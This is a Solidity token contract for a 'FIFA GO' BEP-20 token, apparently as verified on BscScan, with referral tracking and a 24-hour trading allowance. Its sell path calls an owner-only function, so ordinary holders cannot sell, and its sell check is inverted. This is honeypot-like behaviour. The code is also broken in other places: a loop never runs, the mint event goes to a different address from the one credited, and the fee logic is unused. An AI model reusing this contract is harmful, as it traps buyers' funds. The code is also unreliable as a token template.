/**
 *Submitted for verification at BscScan.com on 2022-11-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address public _owner;

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); /* There is no case in which this doesn't hold*/

        return c;
    }
}

contract TESTToken is IERC20, Ownable {
    using SafeMath for uint256;

    string private _name;
    string private _symbol;
    uint8 private _decimal;
    uint8 private _feeRate;
    uint256 private _totalSupply;
    address private _charityAddress;     //奖励/慈善钱包
    address private _marketAddress;       //滑落/交易钱包
    mapping(address => uint256) private _balanceOf;
    mapping(address => mapping(address => uint256)) private _allowances;

    //是否扣税
    mapping(address => bool) private _isExcludedFromFee;

    struct Promotion {
        address addr;       //地址
        uint256 amount;     //金额
        uint256 datetime;   //时间
        bool receiveStatus; //领取状态
    }

    struct TransferTime{
        uint256 datetime;
        uint256 amount;
        bool bUsed;
    }
    
    //推广列表
    mapping(address => Promotion[]) private _promotionInfoList;
    //是否注册
    mapping(address => bool) private _isRegisterUser;
    //是否绑定
    mapping(address => bool) private _isFirstBinding;
    //绑定关系
    mapping(address => address) private _bingdingAccount;
    //推广数量
    mapping(address => uint256) private _promotionBlanceList;
    //24小时限额列表
    mapping(address => TransferTime[]) private _24hourTradableLimit;

    constructor(address tokenOwner, address charityAddress, address marketAddress) {
        _name = "FIFA GO";
        _symbol = "FIFA";
        _decimal = 18;
        _feeRate = 5;
        _totalSupply = 100000 * 10**_decimal;
        _balanceOf[msg.sender] = _totalSupply;
        _owner = msg.sender;

        _isExcludedFromFee[tokenOwner] = true;
        _isExcludedFromFee[address(this)] = true;
        _charityAddress = charityAddress;
        _marketAddress = marketAddress;
    
        emit Transfer(address(0), tokenOwner, _totalSupply);
    }

    receive() external payable {}

    function name() external view returns (string memory) {
        return _name;
    }
    
    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint8) {
        return _decimal;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        external
        view
        override
        returns (uint256)
    {
        return _balanceOf[account];
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        return _transfer(msg.sender, recipient, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private returns(bool success){
        require(sender != address(0), "ERC20: tranfer from the zero address");
        require(recipient != address(0), "ERC20: tranfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        //buy发送方为合约
        if(sender == owner())
        {
            //注册才可以卖
            if(_isRegisterUser[recipient] == true){
                //计算推广,没绑定过
                if(_isFirstBinding[recipient] == false ){
                    address promoter = _bingdingAccount[recipient];
                    if(promoter != address(0x0))
                    {
                        //有效推广
                        _isFirstBinding[recipient] = true;
                        AddPromotion(promoter,  recipient, amount);
                    }
                }
                //增加买卖额度
                addAvailableBalanceBy24Hours(recipient, amount);
            }
             
        }

        //sell
        if(recipient == owner())
        {
            //可用交易额
            uint256 availableBalance = calcAvailableBalance(sender);
            require(amount > availableBalance,"You don't have enough available trading amount");
            
            //减少出售金额
            decreaseAvailableBalance(sender, amount);
        }

        _balanceOf[sender] = _balanceOf[sender].sub(amount);
        _balanceOf[recipient] = _balanceOf[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: tranfer from the zero address");
        require(spender != address(0), "ERC20: tranfer to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(amount)
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 amount)
        public
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(amount)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 amount)
        public
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(amount)
        );
        return true;
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function isRegisterUser(address account)  public view returns (bool) {
        return _isRegisterUser[account];
    }

    function exRegisterUser(address account) public onlyOwner {
        _isRegisterUser[account] = true;
    }

    function unRegisterUser(address account) public onlyOwner {
        _isRegisterUser[account] = false;
    }


    function AddPromotion(address promoter, address promotee,  uint256 amount) 
    public 
    onlyOwner 
    returns (bool) {

        Promotion memory prom = Promotion({
        addr: promotee,
        amount: amount,
        datetime: block.timestamp,
        receiveStatus:false
        });

        _promotionInfoList[promoter].push(prom);
        return true;
    }

    //奖励列表
    function getPomotionsOf(address account)
        external onlyOwner 
        view
        returns (Promotion[] memory)
    {
        Promotion[] memory pomtions = _promotionInfoList[account];
        return pomtions;
    }

    //领取奖励
    function drawPomotionAward(address account,  uint256 datetime,  uint256 amount) 
        external onlyOwner 
        returns (bool) {
        require(account != address(0), "ERC20: tranfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        Promotion[] memory pomtions = _promotionInfoList[account];
        bool bFind = false;
        for(uint i = 0; i < pomtions.length; i++){
            if(pomtions[i].datetime == datetime && pomtions[i].amount == amount)
            {
                pomtions[i].receiveStatus = true;
                bFind = true;
                break;
            }
        }

        if(!bFind)
            return bFind;

        _promotionBlanceList[account] += amount;
        _transfer(msg.sender, account, amount);

         return bFind;
    }

    function addAvailableBalanceBy24Hours(address sender, uint256 amount) 
        public 
        onlyOwner 
        returns (bool) {
        TransferTime memory tft = TransferTime({
        datetime:block.timestamp,
        amount:amount,
        bUsed:false});

        _24hourTradableLimit[sender].push(tft);
        return true;
    }

    function calcAvailableBalanceBy24Hours(address account)  
        private onlyOwner
        view
        returns(uint256)
    {
        uint256 availableBalance = 0;
        TransferTime[] memory tft = _24hourTradableLimit[account];
        for(uint i = 0; i < tft.length; i++){
            if(tft[i].datetime >= (block.timestamp - 24 hours))
            {
                availableBalance += tft[i].amount;
            }
        }

        return availableBalance;
    }

    function calcAvailableBalance(address account)
        public onlyOwner
        view
        returns(uint256){

        uint256 amt24 =calcAvailableBalanceBy24Hours(account);
        uint256 balance = amt24.div(100).mul(10) + amt24;

        return balance;
    }

    function decreaseAvailableBalance(address account, uint256 amount)
        public onlyOwner
        returns (bool){

        uint256 tmpBalance = 0;
        TransferTime[] memory tft = _24hourTradableLimit[account];
        for(uint i = tft.length; i > tft.length; i--)
            if(tft[i].datetime >= (block.timestamp - 24 hours))
            {
                tmpBalance += tft[i].amount;
                
                if(tmpBalance >= amount)
                {
                    uint256 offset = tmpBalance-amount;
                    if(offset != 0)
                    {
                        tft[i].amount = tft[i].amount - offset;
                    }

                    break;
                }  
                _24hourTradableLimit[account].pop();
            }
            return true;
         }
}